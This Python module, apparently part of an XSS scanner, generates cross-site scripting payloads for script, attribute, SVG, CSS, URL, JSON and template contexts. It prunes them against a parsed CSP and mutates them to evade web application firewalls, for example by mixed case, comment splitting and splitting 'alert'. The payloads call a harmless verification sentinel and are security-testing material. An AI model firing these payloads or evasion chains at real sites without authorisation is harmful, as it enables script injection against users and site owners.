from __future__ import annotations

import logging
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass(slots=True)
class PayloadPlan:
    context: str
    payloads: list[str]
    strategy: str


# ---------------------------------------------------------------------------
# WAF evasion helpers
# FIX: original _escape_variants produced syntactically broken payloads
#      (e.g. %3C in a JS string context breaks execution).  Variants are now
#      only applied where they make sense for the context.
# ---------------------------------------------------------------------------

def _url_encode_angles(payload: str) -> str:
    return payload.replace("<", "%3C").replace(">", "%3E")


def _unicode_escape_on(payload: str) -> str:
    """Replace 'on' → 'o\\u006e' to evade keyword filters."""
    return payload.replace("on", "o\\u006e")


def _comment_split(payload: str) -> str:
    """Insert /**/ between adjacent words to break simple pattern matching."""
    return payload.replace(" ", "/**/")


def _case_mutate(payload: str) -> str:
    """Mixed case on tag names."""
    result = []
    upper = False
    for ch in payload:
        if ch.isalpha():
            result.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            result.append(ch)
    return "".join(result)


def _waf_chain_for_html(payload: str) -> list[str]:
    """Return a chain of WAF-evasion variants appropriate for HTML injection."""
    return [
        payload,
        payload.replace("<svg", "<svG"),
        payload.replace("onload", "onpointerenter"),
        payload.replace("onerror", "onpointerenter"),
        payload.replace("alert", "window['ale'+'rt']"),
        _comment_split(payload),
        _case_mutate(payload),
    ]


def _waf_chain_for_js(payload: str) -> list[str]:
    """Return WAF-evasion variants for JS-context payloads (no HTML encoding)."""
    return [
        payload,
        payload.replace("alert", "window['ale'+'rt']"),
        payload.replace("window.__xscan_exec", "window[`__xscan${'_exec'}`]"),
    ]


# ---------------------------------------------------------------------------
# CSP parsing helpers
# ---------------------------------------------------------------------------

def _parse_csp(policy: str) -> dict[str, set[str]]:
    directives: dict[str, set[str]] = {}
    for chunk in (policy or "").split(";"):
        part = chunk.strip()
        if not part:
            continue
        toks = part.split()
        name = toks[0].lower()
        directives[name] = {t.lower() for t in toks[1:]}
    return directives


def _effective_script_src(csp: dict[str, set[str]]) -> set[str]:
    return csp.get("script-src", set()) or csp.get("default-src", set())


def _allows_inline(csp: dict[str, set[str]]) -> bool:
    src = _effective_script_src(csp)
    if not src:
        return True  # no CSP → inline allowed
    return "'unsafe-inline'" in src


def _allows_eval(csp: dict[str, set[str]]) -> bool:
    src = _effective_script_src(csp)
    if not src:
        return True
    return "'unsafe-eval'" in src


def _has_strict_dynamic(csp: dict[str, set[str]]) -> bool:
    return "'strict-dynamic'" in _effective_script_src(csp)


# ---------------------------------------------------------------------------
# Payload primitives
# The sentinel __XSCAN_TOKEN__ is replaced at runtime by the verifier.
# ---------------------------------------------------------------------------

_TOKEN = "__XSCAN_TOKEN__"

_PRIMITIVES: dict[str, list[str]] = {
    "script_breakout": [
        f"';window.__xscan_exec&&window.__xscan_exec('{_TOKEN}');//",
        f'";window.__xscan_exec&&window.__xscan_exec("{_TOKEN}");//',
        f"</script><script>window.__xscan_exec&&window.__xscan_exec('{_TOKEN}')</script>",
        f"</script><img src=x onerror=window.__xscan_exec&&window.__xscan_exec('{_TOKEN}')>",
    ],
    "attr_breakout": [
        f'" autofocus onfocus=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`) x="',
        f"' onmouseover=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`) x='",
        f'"/><svg onload=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`)>',
        f'" onerror=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`) src=x ',
    ],
    "svg_dom": [
        f"<svg><animate onbegin=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`) attributeName=x dur=1s></animate></svg>",
        f"<svg/onload=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`)>",
        f"<svg><script>window.__xscan_exec&&window.__xscan_exec('{_TOKEN}')\u003c/script>",
    ],
    "html_text": [
        f"<img src=x onerror=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`)>",
        f"<details open ontoggle=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`)>",
        f"<body onload=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`)>",
    ],
    "template_breakout": [
        f"{{{{constructor.constructor('window.__xscan_exec&&window.__xscan_exec(\\\\'{_TOKEN}\\\\')')()}}}}",
        f"${{{_TOKEN}}}",   # Freemarker / Thymeleaf probe
    ],
    "polyglot": [
        f"jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload=window.__xscan_exec&&window.__xscan_exec('{_TOKEN}')>",
    ],
    "json_breakout": [
        f'"}},{_TOKEN.join(["<svg/onload=window.__xscan_exec&&window.__xscan_exec(`", "`)")]}}"',
    ],
    "url_context": [
        f"javascript:window.__xscan_exec&&window.__xscan_exec('{_TOKEN}')",
        f"data:text/html,<script>window.__xscan_exec&&window.__xscan_exec('{_TOKEN}')</script>",
    ],
    "css_context": [
        f"</style><svg onload=window.__xscan_exec&&window.__xscan_exec(`{_TOKEN}`)>",
        f"expression(window.__xscan_exec&&window.__xscan_exec('{_TOKEN}'))",
    ],
    "nonce_abuse": [
        # When nonce reuse is suspected, try injecting with observed/guessed nonce
        f"<script nonce=OBSERVED_NONCE>window.__xscan_exec&&window.__xscan_exec('{_TOKEN}')</script>",
    ],
    "eval_bypass": [
        # Works when unsafe-eval is present
        f"eval(atob('{_TOKEN}'))",  # token is pre-encoded at verify time
        f"Function('window.__xscan_exec&&window.__xscan_exec(\"{_TOKEN}\")'  )()",
    ],
}


def generate_payloads(
    context: str,
    encoded: bool,
    csp_header: str,
    waf_suspected: bool,
) -> PayloadPlan:
    """
    Generate context-aware payloads for runtime verification.

    FIX 1: Original always added URL-encoded variants for all contexts, which broke
            JS string contexts (a JS string cannot contain %3C literally and execute).
    FIX 2: CSP pruning was broken — it removed event-handler payloads even when
            unsafe-inline WAS allowed.
    FIX 3: Added CSS, SVG, URL, html_text context handling (was missing).
    FIX 4: Payload deduplication now happens before WAF mutation, not after, to avoid
            exploding the list size.
    FIX 5: Payload length cap raised from 700 to 1500 for polyglot safety.
    """
    csp = _parse_csp(csp_header)
    inline_ok     = _allows_inline(csp)
    eval_ok       = _allows_eval(csp)
    strict_dynamic = _has_strict_dynamic(csp)

    # --- context-based selection ---
    selected: list[str] = []

    if context == "script":
        selected += _PRIMITIVES["script_breakout"]
        if eval_ok:
            selected += _PRIMITIVES["eval_bypass"]

    elif context == "attribute":
        selected += _PRIMITIVES["attr_breakout"]
        selected += _PRIMITIVES["svg_dom"]

    elif context == "html_text":
        selected += _PRIMITIVES["html_text"]
        selected += _PRIMITIVES["svg_dom"]

    elif context == "svg":
        selected += _PRIMITIVES["svg_dom"]

    elif context == "css":
        selected += _PRIMITIVES["css_context"]

    elif context == "url":
        selected += _PRIMITIVES["url_context"]

    elif context == "json":
        selected += _PRIMITIVES["json_breakout"]
        selected += _PRIMITIVES["template_breakout"]

    else:  # unknown — try broad coverage
        selected += _PRIMITIVES["html_text"]
        selected += _PRIMITIVES["svg_dom"]
        selected += _PRIMITIVES["polyglot"]
        selected += _PRIMITIVES["template_breakout"]

    # always include polyglot as a catch-all
    selected += _PRIMITIVES["polyglot"]

    # --- CSP-aware pruning ---
    # FIX 2: only prune inline payloads when inline is NOT allowed
    if not inline_ok:
        selected = [
            p for p in selected
            if not any(pat in p.lower() for pat in (" on", "<script>", "onerror=", "onload="))
        ]
        # add nonce-abuse probe regardless
        selected += _PRIMITIVES["nonce_abuse"]

    if strict_dynamic:
        # strict-dynamic ignores host-based allowlist; nonce/hash required
        selected = [p for p in selected if "javascript:" not in p.lower()]

    # --- encoded context: try double-encoded variants ---
    if encoded:
        encoded_variants = []
        for p in selected[:8]:          # limit explosion
            encoded_variants.append(p.replace("<", "&lt;").replace(">", "&gt;"))
            encoded_variants.append(p.replace("<", "\\u003c").replace(">", "\\u003e"))
        selected += encoded_variants

    # --- deduplicate before WAF expansion (FIX 4) ---
    selected = list(dict.fromkeys(p for p in selected if p))

    # --- WAF mutation ---
    mutated: list[str] = []
    for payload in selected:
        if waf_suspected:
            if context in {"script", "json", "url"}:
                mutated.extend(_waf_chain_for_js(payload))
            else:
                mutated.extend(_waf_chain_for_html(payload))
        else:
            mutated.append(payload)
            # add one light variant even without confirmed WAF
            mutated.append(payload.replace("alert", "window['ale'+'rt']"))

    # --- final dedup + length cap (FIX 5: 1500 chars) ---
    deduped = list(dict.fromkeys(p for p in mutated if p and len(p) < 1500))
    final   = deduped[:60]  # hard cap to prevent runaway verify time

    logger.debug(
        "generate_payloads: context=%s encoded=%s waf=%s csp_inline=%s → %d payloads",
        context, encoded, waf_suspected, inline_ok, len(final),
    )
    return PayloadPlan(context=context, payloads=final, strategy="context-aware-mutation-chain")
